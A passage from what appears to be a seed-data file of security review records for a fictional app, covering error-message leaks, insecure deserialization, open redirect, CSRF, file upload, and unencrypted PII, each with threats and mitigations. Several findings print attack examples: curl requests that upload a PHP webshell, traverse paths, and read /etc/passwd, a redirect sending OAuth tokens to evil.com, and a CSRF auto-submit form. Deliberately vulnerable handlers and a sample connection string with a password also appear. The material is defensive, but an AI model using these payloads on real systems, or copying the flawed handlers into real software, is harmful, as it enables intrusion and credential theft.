        description: "Users can update their **own** role by passing their own user ID (or the special `self` alias) in the URL path. When a user modifies their own role, the audit log entry records `actor_id` and `target_id` as the same value, which many SIEM rules filter out as \"self-service\" actions.\n\nThis means privilege escalation via self-promotion generates audit entries that are:\n1. Not flagged by standard anomaly detection\n2. Categorized as routine profile updates\n3. Excluded from admin action dashboards\n\nThe system should enforce that no user can modify their own role assignment, requiring a separate administrator to approve role changes.",
        severity: "MEDIUM",
        strideCategory: "REPUDIATION",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement hierarchical role-based access control (RBAC)",
        description: "The application needs a proper hierarchical RBAC system for the admin panel. The current implementation treats role assignment as a data validation problem (is the role string valid?) rather than an authorization problem (is the user allowed to perform this action?).\n\n**Required controls:**\n- Role hierarchy enforcement: users can only assign roles **below** their own level\n- Self-modification prevention: users cannot change their own role\n- Approval workflow for sensitive role changes (e.g., promoting to admin requires 2FA confirmation)\n- Rate limiting on role change operations\n- Enhanced audit logging with separate severity for role escalation events\n\nReference: OWASP ASVS V4.0 Section 4.1 (General Access Control Design)",
        severity: "HIGH",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "Role enum exposed in client-side JavaScript bundle",
        description: "The complete role enum including `super_admin` is present in the client-side JavaScript bundle (`/static/js/admin.chunk.js`). While this is an information disclosure rather than a direct vulnerability, it provides attackers with knowledge of valid role values to use in escalation attempts.\n\nThe admin panel's JavaScript includes:\n```javascript\nconst ROLES = ['viewer', 'editor', 'admin', 'super_admin', 'system'];\n```\n\nThe `system` role is particularly interesting as it appears to be an undocumented service account role that may have even higher privileges than `super_admin`.",
        severity: "LOW",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "DEFERRED",
      },
    ],
  },

  // ─── Review 12 ──────────────────────────────────────────────────────────────
  {
    title: "Sensitive data exposure in API error responses",
    summary: "Multiple API endpoints return verbose error responses in production that include internal system details such as database connection strings, stack traces with file paths, SQL queries with parameter values, and internal service URLs. The error handling middleware in `src/middleware/errorHandler.ts` uses a global `DEBUG` flag that is incorrectly set to `true` in the production Docker image.\n\n**Impact:** Information disclosure enabling follow-up attacks:\n\n- Database credentials visible in connection timeout errors\n- Internal network topology revealed through service URLs\n- ORM query structure exposes database schema\n- Stack traces reveal exact file paths and dependency versions\n- Redis connection strings with auth tokens in cache miss errors",
    riskLevel: "MEDIUM",
    bundleStatus: "COMPLETED",
    reviewStatus: "APPROVED",
    source: "NOTION",
    externalId: "PAGE-008",
    findings: [
      {
        type: "THREAT",
        title: "Database credentials leaked in error responses",
        description: "When a database connection timeout occurs, the error response includes the full connection string:\n\n```json\n{\n  \"error\": \"DatabaseConnectionError\",\n  \"details\": {\n    \"message\": \"Connection timed out\",\n    \"connectionString\": \"postgresql://app_user:Pr0d_S3cur3!@10.0.3.45:5432/loomii_prod?sslmode=require\",\n    \"retryCount\": 3,\n    \"lastAttempt\": \"2024-11-15T08:23:41Z\"\n  },\n  \"stack\": \"Error: Connection timed out\\n    at PgPool.connect (/app/node_modules/pg-pool/index.js:45:11)...\"\n}\n```\n\nThis occurs because `errorHandler.ts:28` serializes the entire error object including the `connectionConfig` property when `process.env.DEBUG === 'true'`. The production Dockerfile sets `ENV DEBUG=true` on line 14 — likely a leftover from development.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Internal service topology exposed via error propagation",
        description: "Errors from internal microservices are propagated to the client with full upstream context:\n\n```json\n{\n  \"error\": \"UpstreamServiceError\",\n  \"service\": \"billing-service\",\n  \"endpoint\": \"http://billing-svc.internal.cluster:3001/api/v2/charge\",\n  \"headers\": {\n    \"x-service-auth\": \"svc_key_a8f3...\",\n    \"x-request-id\": \"req_abc123\"\n  }\n}\n```\n\nThis reveals:\n- Internal service names and ports\n- Kubernetes cluster DNS patterns\n- Inter-service authentication tokens\n- API versioning information\n\nAn attacker with network access (e.g., via SSRF) could use this information to directly target internal services.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "MITIGATION",
        title: "Implement structured error sanitization middleware",
        description: "Replace the current error handler with a sanitization layer that:\n\n1. **Maps internal errors to safe external codes:**\n   - `DatabaseConnectionError` → `503 Service Unavailable` (no details)\n   - `ValidationError` → `400 Bad Request` (field-level only)\n   - `AuthenticationError` → `401 Unauthorized` (generic message)\n   - All others → `500 Internal Server Error` (correlation ID only)\n\n2. **Strips sensitive fields before serialization:**\n   ```typescript\n   const REDACTED_FIELDS = ['connectionString', 'password', 'token', 'secret', 'headers', 'stack'];\n   ```\n\n3. **Sends full details to structured logging** (CloudWatch/Datadog) with the correlation ID\n\n4. **Remove `DEBUG=true` from production Dockerfile** and use environment-specific config injection\n\nThe error response to clients should only ever contain: `statusCode`, `message` (generic), `correlationId`, and optionally `validationErrors` for 400 responses.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "SQL queries with bound parameters visible in ORM errors",
        description: "Prisma ORM errors include the full SQL query with interpolated parameters:\n\n```\nPrismaClientKnownRequestError: \nInvalid `prisma.user.findFirst()` invocation:\n\nSELECT * FROM \"User\" WHERE \"email\" = 'admin@company.com' AND \"tenantId\" = 'ten_abc123'\n\nUnique constraint failed on the fields: (`email`, `tenantId`)\n```\n\nThis exposes:\n- Database table and column naming conventions\n- Actual data values (emails, tenant IDs)\n- Query structure enabling SQL injection fingerprinting\n- Prisma version and configuration\n\nEven with the DEBUG fix, Prisma errors need explicit sanitization as they embed query data in the error message itself.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },

  // ─── Review 13 ──────────────────────────────────────────────────────────────
  {
    title: "Insecure deserialization in webhook handler",
    summary: "The webhook processing endpoint at `/api/webhooks/ingest` deserializes incoming JSON payloads using a custom parser that supports object instantiation via `__type` annotations. When a payload contains a `__type` field, the parser attempts to instantiate the corresponding class, enabling Remote Code Execution (RCE) if an attacker crafts a payload referencing dangerous built-in classes or prototype chain manipulation.\n\n**Impact:** Critical server compromise:\n\n- Arbitrary code execution on the webhook processing server\n- Access to environment variables (API keys, database credentials)\n- Lateral movement to internal services via the server's network position\n- Data exfiltration from the database\n- Potential for persistent backdoor installation",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-023",
    findings: [
      {
        type: "THREAT",
        title: "Custom JSON parser enables remote code execution via __type annotation",
        description: "The webhook handler uses a custom `deserializePayload()` function (in `src/lib/serializer.ts`) that supports type-annotated JSON:\n\n```typescript\n// src/lib/serializer.ts:34\nfunction deserializePayload(json: string) {\n  return JSON.parse(json, (key, value) => {\n    if (value && typeof value === 'object' && value.__type) {\n      const Constructor = globalRegistry[value.__type];\n      if (Constructor) return new Constructor(value.data);\n    }\n    return value;\n  });\n}\n```\n\nThe `globalRegistry` is populated at startup and includes classes like `Buffer`, `Date`, `URL`, and custom model classes. An attacker can exploit this by:\n\n1. Sending a payload with `{\"__type\": \"Function\", \"data\": \"return process.env\"}` if Function is registered\n2. Using prototype chain pollution via nested `__proto__` assignments\n3. Exploiting constructor side-effects in registered classes\n\n**Proof of concept:**\n```bash\ncurl -X POST https://app.example.com/api/webhooks/ingest \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"__type\": \"URL\", \"data\": \"file:///etc/passwd\"}'\n```",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "HIGH",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Missing webhook signature verification allows payload injection",
        description: "The webhook endpoint does not verify the cryptographic signature of incoming payloads. While most webhook providers (GitHub, Stripe, Linear) include an HMAC signature in request headers (`X-Hub-Signature-256`, `Stripe-Signature`, etc.), the handler at `/api/webhooks/ingest` processes any payload from any source without validation.\n\nThis means:\n- Any internet-connected client can send arbitrary payloads to the deserializer\n- There is no way to verify the payload originated from a trusted source\n- Rate limiting is the only defense against abuse (currently set to 100 req/min)\n\nEven if the deserialization vulnerability is fixed, the lack of signature verification means attackers can send crafted payloads to test for new vulnerabilities or exploit application logic.",
        severity: "HIGH",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Replace custom deserializer with safe JSON parsing",
        description: "The custom type-annotated deserializer must be replaced with standard `JSON.parse()` without a reviver function, or with a reviver that only handles primitive type coercion (dates, BigInts).\n\n**Required changes:**\n1. Remove `globalRegistry` and the `__type` deserialization logic entirely\n2. Use plain `JSON.parse()` for webhook payloads\n3. Validate parsed objects against a Zod schema per webhook source\n4. Implement webhook signature verification per provider:\n   - Linear: `X-Linear-Signature` with HMAC-SHA256\n   - GitHub: `X-Hub-Signature-256`\n   - Stripe: `Stripe-Signature` with timestamp validation\n5. Add IP allowlisting as defense-in-depth for known webhook sources\n6. Implement webhook payload size limits (current: unlimited)\n\nReference: CWE-502 (Deserialization of Untrusted Data), OWASP Deserialization Cheat Sheet",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "Webhook processing runs with elevated service permissions",
        description: "The webhook handler runs in the main application process with full database access and service credentials. There is no sandboxing or permission scoping for webhook processing. The database connection used by the webhook handler has the same `app_user` credentials used by the rest of the application, meaning a successful RCE gives immediate access to all application data.\n\nRecommendation: Process webhooks in an isolated worker with minimal permissions (dedicated database role with only INSERT on event tables, no access to user/payment tables). Consider using a message queue to decouple ingestion from processing.",
        severity: "MEDIUM",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "HIGH",
        status: "DEFERRED",
      },
    ],
  },

  // ─── Review 14 ──────────────────────────────────────────────────────────────
  {
    title: "Unvalidated redirect in OAuth callback flow",
    summary: "The OAuth 2.0 callback handler at `/api/auth/callback` accepts a `redirect_uri` parameter from the query string and performs an HTTP 302 redirect to it after successful authentication without validating that the URI belongs to an allowed domain. This enables phishing attacks where users are redirected to malicious sites that mimic the application's UI to steal tokens or credentials.\n\n**Impact:** Account compromise through credential theft:\n\n- OAuth tokens can be intercepted by attacker-controlled redirect targets\n- Users can be redirected to convincing phishing pages post-authentication\n- The redirect happens after legitimate SSO login, making it appear trustworthy\n- Tokens passed as URL fragments may leak via Referer headers on malicious sites",
    riskLevel: "MEDIUM",
    bundleStatus: "COMPLETED",
    reviewStatus: "DRAFT",
    source: "NOTION",
    externalId: "PAGE-010",
    findings: [
      {
        type: "THREAT",
        title: "Open redirect enables OAuth token theft via malicious redirect_uri",
        description: "The OAuth callback handler constructs the redirect URL directly from user input:\n\n```typescript\n// src/routes/auth.ts:89\napp.get('/api/auth/callback', async (req, res) => {\n  const { code, state, redirect_uri } = req.query;\n  const token = await exchangeCode(code, state);\n  // VULNERABILITY: No validation of redirect_uri\n  res.redirect(302, `${redirect_uri}?token=${token.access_token}`);\n});\n```\n\n**Attack scenario:**\n1. Attacker crafts URL: `https://app.example.com/api/auth/login?redirect_uri=https://evil.com/capture`\n2. User clicks link (appears legitimate — it's the real app domain)\n3. User completes SSO authentication normally\n4. After successful auth, user is redirected to `https://evil.com/capture?token=eyJhbG...`\n5. Attacker captures the valid OAuth token\n\nThe attack is especially effective because the redirect happens **after** legitimate authentication, so users have already verified they're on the correct site.",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "State parameter not validated against CSRF in callback",
        description: "The `state` parameter in the OAuth callback is extracted from the query string but not validated against the session-stored state value. This means:\n\n1. The CSRF protection intended by OAuth 2.0's state parameter is ineffective\n2. An attacker can initiate an OAuth flow with their own account and have the victim complete it\n3. Combined with the open redirect, this enables a full account takeover chain\n\n```typescript\n// Current code — state is used but never verified:\nconst { code, state, redirect_uri } = req.query;\nconst token = await exchangeCode(code, state); // state passed but not checked\n```\n\n**Expected behavior:**\n```typescript\nconst sessionState = req.session.oauthState;\nif (state !== sessionState) return res.status(403).json({ error: 'Invalid state' });\ndelete req.session.oauthState;\n```",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "MITIGATION",
        title: "Implement strict redirect URI allowlist validation",
        description: "The OAuth callback must validate the `redirect_uri` against a strict allowlist before performing any redirect.\n\n**Implementation requirements:**\n\n1. Maintain a configuration-driven allowlist of permitted redirect URIs:\n   ```typescript\n   const ALLOWED_REDIRECTS = [\n     'https://app.example.com',\n     'https://app.example.com/dashboard',\n     'http://localhost:3000', // dev only, gated by NODE_ENV\n   ];\n   ```\n\n2. Validate using URL parsing (not string matching) to prevent bypasses:\n   ```typescript\n   const target = new URL(redirect_uri);\n   const isAllowed = ALLOWED_REDIRECTS.some(allowed => {\n     const a = new URL(allowed);\n     return target.origin === a.origin && target.pathname.startsWith(a.pathname);\n   });\n   ```\n\n3. Reject or default to `/dashboard` if validation fails\n4. Log rejected redirect attempts for security monitoring\n5. Validate `state` parameter against session-stored value",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },

  // ─── Review 15 ──────────────────────────────────────────────────────────────
  {
    title: "Missing CSRF protection on state-changing endpoints",
    summary: "The application's API layer lacks Cross-Site Request Forgery (CSRF) protection on 23 state-changing endpoints that use cookie-based session authentication. While the API also supports Bearer token authentication (which is inherently CSRF-safe), the cookie-based session path does not implement any CSRF tokens, same-site cookie attributes, or origin validation.\n\n**Impact:** Authenticated users can be tricked into performing unintended actions:\n\n- Changing account settings (email, password, 2FA)\n- Initiating financial transactions\n- Modifying project configurations\n- Revoking or creating API keys\n- Adding or removing team members",
    riskLevel: "MEDIUM",
    bundleStatus: "REVIEWING",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-025",
    findings: [
      {
        type: "THREAT",
        title: "Session cookies lack SameSite attribute enabling cross-origin requests",
        description: "The session cookie is set without the `SameSite` attribute:\n\n```typescript\n// src/middleware/session.ts:15\nres.cookie('session_id', token, {\n  httpOnly: true,\n  secure: true,\n  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days\n  // Missing: sameSite: 'lax' or 'strict'\n});\n```\n\nWithout `SameSite`, browsers will include the cookie in cross-origin requests (legacy behavior in some browsers, or defaults to `Lax` in modern Chrome). Combined with the lack of CSRF tokens, this allows:\n\n```html\n<!-- Attacker's page -->\n<form action=\"https://app.example.com/api/account/email\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n  <input type=\"submit\" value=\"Click for free prize!\" />\n</form>\n<script>document.forms[0].submit();</script>\n```\n\nThe victim's browser automatically includes the session cookie, and the server processes the request as legitimate.",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "API key creation vulnerable to CSRF-based key exfiltration",
        description: "The `POST /api/settings/api-keys` endpoint creates new API keys and returns the key value in the response body. An attacker can exploit CSRF to create an API key on behalf of the victim:\n\n1. Attacker hosts page with: `fetch('https://app.example.com/api/settings/api-keys', {method: 'POST', credentials: 'include', body: JSON.stringify({name: 'backup'})})`\n2. The request fails due to CORS (response is opaque)\n3. **However**, the key IS created server-side\n4. If the attacker can list keys (via another CSRF or social engineering), they can identify and use the created key\n\nMore critically, if any endpoint returns created resources in a CORS-permissive way, the key could be directly exfiltrated. The `Access-Control-Allow-Origin` header on this endpoint is currently `*` for preflight requests.",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement defense-in-depth CSRF protection",
        description: "Multiple layers of CSRF protection should be implemented:\n\n**Layer 1 — SameSite cookies (immediate):**\n```typescript\nres.cookie('session_id', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'lax', // or 'strict' for maximum protection\n  maxAge: 7 * 24 * 60 * 60 * 1000,\n});\n```\n\n**Layer 2 — Origin/Referer validation:**\n```typescript\nconst origin = req.headers.origin || req.headers.referer;\nif (!ALLOWED_ORIGINS.includes(new URL(origin).origin)) {\n  return res.status(403).json({ error: 'Invalid origin' });\n}\n```\n\n**Layer 3 — CSRF token (for forms):**\n- Generate per-session CSRF token\n- Include in all forms as hidden field\n- Validate on all state-changing requests using cookie auth\n\n**Layer 4 — Custom header requirement:**\n- Require `X-Requested-With: XMLHttpRequest` on all API calls\n- Simple requests (form submissions) won't include this header",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "23 state-changing endpoints identified without CSRF protection",
        description: "Audit of all POST/PUT/DELETE endpoints using cookie-based session auth:\n\n**Account management (7):**\n- `PUT /api/account/email` — change email\n- `PUT /api/account/password` — change password\n- `POST /api/account/2fa/enable` — enable 2FA\n- `DELETE /api/account/2fa` — disable 2FA\n- `POST /api/account/sessions/revoke` — revoke sessions\n- `DELETE /api/account` — delete account\n- `PUT /api/account/profile` — update profile\n\n**Team management (6):**\n- `POST /api/team/members/invite` — invite member\n- `DELETE /api/team/members/:id` — remove member\n- `PUT /api/team/members/:id/role` — change role\n- `PUT /api/team/settings` — update team settings\n- `POST /api/team/transfer` — transfer ownership\n- `DELETE /api/team` — delete team\n\n**API & Integrations (5):**\n- `POST /api/settings/api-keys` — create API key\n- `DELETE /api/settings/api-keys/:id` — revoke API key\n- `POST /api/integrations/connect` — connect integration\n- `DELETE /api/integrations/:id` — disconnect integration\n- `PUT /api/integrations/:id` — update integration config\n\n**Project & Data (5):**\n- `POST /api/projects` — create project\n- `DELETE /api/projects/:id` — delete project\n- `POST /api/projects/:id/export` — export project data\n- `PUT /api/projects/:id/settings` — update project settings\n- `POST /api/reviews/:id/approve` — approve review",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
    ],
  },

  // ─── Review 16 ──────────────────────────────────────────────────────────────
  {
    title: "Insecure file upload allows arbitrary code execution",
    summary: "The file upload endpoint at `/api/uploads/documents` accepts files without proper validation of file type, content, or size beyond the declared `Content-Type` header. An attacker can upload a malicious file (e.g., a PHP webshell, server-side template, or polyglot file) that gets stored in the application's static file serving directory. If the uploaded file is later served with an executable content type or processed by a vulnerable parser, it enables Remote Code Execution.\n\n**Impact:** Complete server compromise:\n\n- Upload of webshells enabling persistent backdoor access\n- Server-Side Template Injection via uploaded `.ejs`/`.pug` files\n- Stored XSS via SVG files with embedded JavaScript\n- Denial of service via zip bombs or oversized files\n- PDF parser exploitation via crafted PDFs",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "NOTION",
    externalId: "PAGE-012",
    findings: [
      {
        type: "THREAT",
        title: "No server-side file type validation allows executable upload",
        description: "The upload handler trusts the client-provided `Content-Type` header and file extension without performing server-side content validation (magic byte inspection):\n\n```typescript\n// src/routes/uploads.ts:22\napp.post('/api/uploads/documents', upload.single('file'), async (req, res) => {\n  const file = req.file;\n  // Only checks: file exists and size < 50MB\n  if (!file || file.size > 50 * 1024 * 1024) {\n    return res.status(400).json({ error: 'Invalid file' });\n  }\n  // Stores with original extension in publicly accessible directory\n  const path = `/uploads/${Date.now()}-${file.originalname}`;\n  await fs.writeFile(`./public${path}`, file.buffer);\n  res.json({ url: path });\n});\n```\n\n**Exploitation:**\n```bash\n# Upload PHP webshell disguised as image\ncurl -X POST https://app.example.com/api/uploads/documents \\\n  -F \"file=@webshell.php;type=image/png;filename=avatar.php\"\n# Access webshell\ncurl https://app.example.com/uploads/1700000000-avatar.php?cmd=id\n```\n\nEven without PHP execution, SVG files with embedded `<script>` tags enable stored XSS when served inline.",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Path traversal in filename allows overwriting application files",
        description: "The upload handler uses `file.originalname` directly in the storage path without sanitizing directory traversal sequences:\n\n```bash\n# Overwrite application configuration\ncurl -X POST https://app.example.com/api/uploads/documents \\\n  -F \"file=@malicious.js;filename=../../../src/config/database.js\"\n```\n\nWhile `Date.now()-` is prepended, the original filename can contain `../` sequences that navigate out of the intended upload directory. If the write succeeds, an attacker could:\n- Overwrite source files (if running from source)\n- Replace static assets for phishing\n- Modify configuration files\n- Plant files in cron directories for scheduled execution",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement comprehensive file upload security controls",
        description: "The file upload system requires multiple security layers:\n\n**1. Content validation:**\n- Verify file magic bytes match declared type (use `file-type` npm package)\n- Allowlist permitted MIME types: `image/png`, `image/jpeg`, `application/pdf`, `text/csv`\n- Reject executables, scripts, templates, and archives\n\n**2. Filename sanitization:**\n```typescript\nconst safeName = crypto.randomUUID() + path.extname(file.originalname).replace(/[^.a-z0-9]/gi, '');\n```\n\n**3. Storage isolation:**\n- Store uploads in a separate S3 bucket or isolated directory\n- Never serve uploads from the same origin as the application\n- Use a CDN with `Content-Disposition: attachment` headers\n- Set `X-Content-Type-Options: nosniff` on all responses\n\n**4. Size and rate limiting:**\n- Per-file size limit: 10MB\n- Per-user daily upload limit: 100MB\n- Rate limit: 10 uploads per minute\n\n**5. Virus scanning:**\n- Integrate ClamAV or similar for uploaded file scanning\n- Quarantine files until scan completes",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "HIGH",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "Uploaded files served with incorrect security headers",
        description: "Files in the `/uploads/` directory are served by the static file middleware with permissive headers:\n\n```\nContent-Type: [original type from upload]\nAccess-Control-Allow-Origin: *\n```\n\nMissing security headers:\n- `X-Content-Type-Options: nosniff` — browsers may MIME-sniff and execute files\n- `Content-Security-Policy` — no CSP on uploaded file responses\n- `Content-Disposition: attachment` — files render inline by default\n\nThis means an uploaded SVG with `<script>alert(document.cookie)</script>` will execute in the application's origin when accessed directly, enabling stored XSS with full cookie access.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "MITIGATION",
        title: "Immediate hotfix: disable direct file serving",
        description: "As an immediate mitigation before the full fix is implemented:\n\n1. Remove the static file serving for `/uploads/`:\n   ```typescript\n   // REMOVE: app.use('/uploads', express.static('./public/uploads'));\n   ```\n\n2. Add a proxy endpoint that forces download and sanitizes content-type:\n   ```typescript\n   app.get('/api/files/:id', async (req, res) => {\n     const file = await getFileMetadata(req.params.id);\n     res.setHeader('Content-Disposition', `attachment; filename=\"${file.safeName}\"`);\n     res.setHeader('Content-Type', 'application/octet-stream');\n     res.setHeader('X-Content-Type-Options', 'nosniff');\n     res.sendFile(file.storagePath);\n   });\n   ```\n\n3. Block upload of any file with extensions: `.php`, `.js`, `.ts`, `.ejs`, `.pug`, `.sh`, `.bat`, `.exe`, `.svg`\n\nThis does not fix the root cause but prevents immediate exploitation while the comprehensive fix is developed.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },

  // ─── Review 17 ──────────────────────────────────────────────────────────────
  {
    title: "Missing encryption for PII in database columns",
    summary: "Personally Identifiable Information (PII) including email addresses, phone numbers, physical addresses, and government ID numbers are stored in plaintext in the PostgreSQL database without column-level encryption. If the database is compromised through SQL injection, backup theft, or unauthorized access, all PII is immediately readable without any additional decryption step.\n\n**Impact:** Mass PII exposure affecting all users:\n\n- Names, emails, phone numbers of ~45,000 users\n- Physical addresses for ~12,000 users with verified accounts\n- Government ID numbers for ~3,000 users who completed KYC\n- Payment method last-4 digits and billing addresses\n- SSO tokens and refresh tokens stored alongside user records",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "APPROVED",
    source: "LINEAR",
    externalId: "LOO-027",
    findings: [
      {
        type: "THREAT",
        title: "Government ID numbers stored in plaintext enable identity theft",
        description: "The `user_kyc` table stores government-issued ID numbers (SSN, passport numbers, national ID) in a plaintext `VARCHAR(64)` column:\n\n```sql\nCREATE TABLE user_kyc (\n  id UUID PRIMARY KEY,\n  user_id UUID REFERENCES users(id),\n  id_type VARCHAR(20),  -- 'ssn', 'passport', 'national_id'\n  id_number VARCHAR(64), -- PLAINTEXT government ID\n  verified_at TIMESTAMP,\n  document_url TEXT      -- URL to uploaded ID document image\n);\n```\n\nA single SQL injection vulnerability anywhere in the application provides direct access to all government ID numbers. Database backups (stored in S3) also contain this data in plaintext.\n\n**Regulatory impact:**\n- GDPR Article 32: Requires \"appropriate technical measures\" including encryption\n- PCI-DSS: While not directly applicable, industry best practice mandates encryption at rest\n- State breach notification laws: Plaintext SSNs trigger mandatory notification in all 50 US states",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "HIGH",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Database backups contain unencrypted PII accessible via S3",
        description: "Automated database backups are stored in S3 bucket `loomii-db-backups-prod` with the following access configuration:\n\n- Bucket is not public, but accessible to the entire `engineering` IAM role (47 users)\n- Backups are stored as plaintext `pg_dump` files (not encrypted with AWS KMS)\n- Retention period: 90 days (90 copies of all PII)\n- No access logging enabled on the bucket\n\nAny engineer with AWS console access can download a backup and query all user PII locally:\n```bash\naws s3 cp s3://loomii-db-backups-prod/daily/2024-11-15.sql.gz ./\ngunzip 2024-11-15.sql.gz\ngrep -i 'INSERT INTO user_kyc' 2024-11-15.sql\n```\n\nThis violates the principle of least privilege and creates an exfiltration path that bypasses all application-level access controls.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement application-level encryption for PII columns",
        description: "Deploy application-level envelope encryption for all PII columns using AWS KMS:\n\n**Architecture:**\n1. Generate a Data Encryption Key (DEK) per tenant using AWS KMS\n2. Encrypt PII fields with AES-256-GCM using the DEK before database write\n3. Store encrypted ciphertext + IV + auth tag in the database column\n4. Decrypt on read using the tenant's DEK (cached in memory with TTL)\n\n**Implementation:**\n```typescript\n// src/lib/encryption.ts\nclass FieldEncryptor {\n  async encrypt(plaintext: string, tenantId: string): Promise<string> {\n    const dek = await this.getDEK(tenantId);\n    const iv = crypto.randomBytes(12);\n    const cipher = crypto.createCipheriv('aes-256-gcm', dek, iv);\n    const encrypted = Buffer.concat([cipher.update(plaintext), cipher.final()]);\n    const tag = cipher.getAuthTag();\n    return `${iv.toString('base64')}.${encrypted.toString('base64')}.${tag.toString('base64')}`;\n  }\n}\n```\n\n**Columns requiring encryption:**\n- `users.email`, `users.phone`, `users.full_name`\n- `user_kyc.id_number`, `user_kyc.document_url`\n- `addresses.street`, `addresses.city`, `addresses.postal_code`\n- `payment_methods.billing_address`\n\n**Migration strategy:** Encrypt in-place using a background job, with a flag indicating encryption status per row.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "HIGH",
        status: "OPEN",
      },
      {
        type: "MITIGATION",
        title: "Encrypt database backups and restrict access immediately",
        description: "While application-level encryption is being implemented, immediately secure database backups:\n\n1. **Enable S3 SSE-KMS encryption** on the backup bucket:\n   ```bash\n   aws s3api put-bucket-encryption --bucket loomii-db-backups-prod \\\n     --server-side-encryption-configuration '{\"Rules\":[{\"ApplyServerSideEncryptionByDefault\":{\"SSEAlgorithm\":\"aws:kms\",\"KMSMasterKeyID\":\"alias/db-backup-key\"}}]}'\n   ```\n\n2. **Restrict bucket access** to a dedicated `db-backup-admin` role (2-3 people max)\n\n3. **Enable S3 access logging** to detect unauthorized download attempts\n\n4. **Reduce retention** from 90 days to 30 days for daily backups\n\n5. **Enable RDS encryption at rest** if not already enabled (transparent, no app changes)\n\nThis reduces the attack surface while the comprehensive encryption solution is built.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },

  // ─── Review 18 ──────────────────────────────────────────────────────────────
  {
    title: "Path traversal in template rendering engine",
    summary: "The application's template rendering system at `/api/reports/generate` accepts a `template` parameter that is used to construct a file path for loading report templates. The parameter is not sanitized for directory traversal sequences (`../`), allowing an attacker to read arbitrary files from the server's filesystem by navigating outside the intended template directory.\n\n**Impact:** Arbitrary file read from the server:\n\n- Read application source code including hardcoded secrets\n- Access `/etc/passwd` and other system files\n- Read environment configuration files (`.env`, `config.json`)\n- Access other users' uploaded files\n- Read database configuration with credentials\n- Access SSH keys or TLS certificates stored on the filesystem",
    riskLevel: "HIGH",
    bundleStatus: "REVIEWING",
    reviewStatus: "IN_REVIEW",
    source: "NOTION",
    externalId: "PAGE-014",
    findings: [
      {
        type: "THREAT",
        title: "Directory traversal enables arbitrary file read via template parameter",
